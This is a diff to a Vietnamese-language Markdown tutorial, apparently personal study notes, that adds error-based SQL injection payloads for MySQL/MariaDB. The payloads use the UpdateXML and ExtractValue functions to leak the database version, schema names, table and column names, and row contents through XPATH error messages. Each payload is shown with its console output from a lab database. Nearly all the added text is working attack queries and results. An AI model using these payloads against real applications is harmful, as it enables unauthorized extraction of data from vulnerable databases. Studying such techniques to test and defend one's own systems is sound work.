@@ -668,6 +668,25 @@
 
   - Lấy ra tên các *column* dựa trên các *table*
 
+  - Payload 5:
+
+    ```mysql
+    select * from menu where id = 1 and updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),NAME_MENU,CHAR(126)) FROM menu LIMIT 0,1)),null)
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 and updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),NAME_MENU,CHAR(126)) FROM menu LIMIT 0,1)),null);
+    ERROR 1105 (HY000): XPATH syntax error: ':~Menu 2~'
+    MariaDB [xssuser]> select * from menu where id = 1 and updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),NAME_MENU,CHAR(126)) FROM menu LIMIT 1,1)),null);
+    ERROR 1105 (HY000): XPATH syntax error: ':~Menu 4~'
+    MariaDB [xssuser]> select * from menu where id = 1 and updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),NAME_MENU,CHAR(126)) FROM menu LIMIT 2,1)),null);
+    ERROR 1105 (HY000): XPATH syntax error: ':~Menu 5~'
+    MariaDB [xssuser]> select * from menu where id = 1 and updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),NAME_MENU,CHAR(126)) FROM menu LIMIT 3,1)),null);
+    ERROR 1105 (HY000): XPATH syntax error: ':~Menu 6~'
+    ```
+
+    
+
 - Có thể rút gọn các *payload* thành
 
   - Payload:
@@ -697,6 +716,73 @@
     user'
     ```
 
-- Sử dụng *Extractvalue function*
+- Sử dụng *Extractvalue function*, về cơ bản thì *Extractvalue function* rất giống với *UpdateXML function*
+
+  - Payload:
+
+    ```mysql
+    select * from menu where id = 1 and extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)));
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 and extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)));
+    ERROR 1105 (HY000): XPATH syntax error: '~10.1.41-MariaDB-0ubuntu0.18.04.'
+    ```
+
+  - Payload:
+
+    ```mysql
+    select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 3,1)))
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 3,1)));
+    ERROR 1105 (HY000): XPATH syntax error: ':~sqlinjection~'
+    MariaDB [xssuser]> select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 4,1)));
+    ERROR 1105 (HY000): XPATH syntax error: ':~xssuser~'
+    ```
+
+  - Payload:
+
+    ```mysql
+    select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema='xssuser' LIMIT 0,1)))
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema='xssuser' LIMIT 0,1)));
+    ERROR 1105 (HY000): XPATH syntax error: ':~menu~'
+    MariaDB [xssuser]> select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema='xssuser' LIMIT 1,1)));
+    ERROR 1105 (HY000): XPATH syntax error: ':~user~'
+    ```
+
+  - Payload:
+
+    ```mysql
+    select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='menu' LIMIT 0,1)))
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='menu' LIMIT 0,1)));
+    ERROR 1105 (HY000): XPATH syntax error: ':~ID~'
+    MariaDB [xssuser]> select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='menu' LIMIT 1,1)));
+    ERROR 1105 (HY000): XPATH syntax error: ':~NAME_MENU~'
+    ```
+
+  - Payload:
+
+    ```mysql
+    select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),NAME_MENU,CHAR(126)) FROM menu LIMIT 0,1)))
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),NAME_MENU,CHAR(126)) FROM menu LIMIT 0,1)));
+    ERROR 1105 (HY000): XPATH syntax error: ':~Menu 2~'
+    MariaDB [xssuser]> select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),NAME_MENU,CHAR(126)) FROM menu LIMIT 1,1)));
+    ERROR 1105 (HY000): XPATH syntax error: ':~Menu 4~'
+    MariaDB [xssuser]> select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),NAME_MENU,CHAR(126)) FROM menu LIMIT 2,1)));
+    ERROR 1105 (HY000): XPATH syntax error: ':~Menu 5~'
+    MariaDB [xssuser]> select * from menu where id = 1 and extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),NAME_MENU,CHAR(126)) FROM menu LIMIT 3,1)));
+    ERROR 1105 (HY000): XPATH syntax error: ':~Menu 6~'
+    ```
 
 - To be continue
